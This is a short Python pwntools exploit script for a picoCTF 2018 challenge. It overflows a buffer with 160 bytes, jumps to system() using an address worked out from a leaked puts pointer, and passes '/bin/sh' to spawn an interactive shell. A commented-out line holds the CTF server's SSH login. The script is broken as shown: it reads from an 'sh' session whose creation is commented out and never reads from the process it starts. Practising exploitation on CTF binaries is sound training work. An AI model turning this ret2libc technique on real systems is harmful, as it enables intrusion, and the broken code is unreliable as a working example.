from pwn import *
import re
#shell=ssh('thelshell', '2018shell4.picoctf.com',password='pizzacheese', port=22)
#sh=shell.run('sh')
#sh.sendline("cd /problems/got-2-learn-libc_3_6e9881e9ff61c814aafaf92921e88e33")
gdb_puts=0xf7e75140
gdb_sys=0xf7e58940
offset=abs(gdb_puts-gdb_sys)
elf=ELF("./vuln")
p=elf.process()
prompt=sh.recv()
print(prompt)
sh.recvline()
puts=int(re.findall('puts: (.*)', prompt)[0], 16)
bin_sh=int(re.findall('useful_string: (.*)', prompt)[0], 16)
#print("puts: ",hex(puts))
#print("bin_sh: ",hex(bin_sh))
system=puts-offset
print("system: ",hex(system))
payload='A'*160
payload+=p32(system)
payload+='JUNK'
payload+=p32(bin_sh) #.decode('utf-8')
p.sendline(payload)
p.interactive()
#p.close()
#sh.interactive()
#sh.close()
